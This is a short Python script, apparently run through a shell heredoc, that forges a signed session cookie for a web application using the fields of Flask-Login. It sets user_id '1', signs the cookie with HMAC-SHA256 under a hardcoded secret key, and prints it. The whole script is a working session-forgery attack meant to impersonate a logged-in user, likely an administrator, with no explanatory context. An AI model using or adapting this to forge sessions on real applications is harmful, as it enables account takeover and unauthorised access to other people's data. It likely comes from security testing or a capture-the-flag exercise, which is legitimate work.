import json, base64, hmac, hashlib, time, os

# Session data
session_data = {'_fresh': True, 'user_id': '1', '_user_id': '1', '_id': 'a'*32}
payload = json.dumps(session_data, separators=(',', ':')).encode()

# Base64 encode payload (URL-safe, no padding)
b64_payload = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()

# Generate timestamp
ts = str(int(time.time()))

# Create signature: HMAC-SHA256 of payload + '.' + timestamp
signing_str = f'{b64_payload}.{ts}'.encode()
sig = hmac.new(b'G7x7pMBBduHU0HH5avEQ', signing_str, hashlib.sha256).hexdigest()

# Combine
cookie = f'{b64_payload}.{ts}.{sig}'
print(cookie)
EOF

